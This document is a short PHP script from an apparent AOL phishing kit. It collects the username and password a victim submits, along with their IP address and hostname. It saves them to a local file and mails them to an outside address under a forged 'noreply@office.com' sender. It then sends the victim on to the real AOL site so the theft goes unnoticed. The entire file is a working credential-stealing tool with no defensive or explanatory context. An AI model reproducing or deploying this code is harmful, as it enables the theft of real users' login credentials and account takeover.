<?
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$msg .= "\n";
$msg .= "Username : ".$_POST['username']."\n";
$msg .= "Password : ".$_POST['password']."\n";
$msg .= "IP: ".$ip."\n";
$msg .= "HostName: ".$hostname."\n";
$msg .= "\n";
$message .= "--------------AOL By Mckuzinno------------\n\n";
$post = "richmoore19979@yandex.com";
$fp = fopen("use.txt","a");
fputs($fp,$msg);
fclose($fp);
$subj = "Target - ".$_POST['username']."\n";
$from = "From:AOL<noreply@office.com>";
mail("$post",$subj, $msg, $from);
header("Location:  https://www.aol.com");  

?>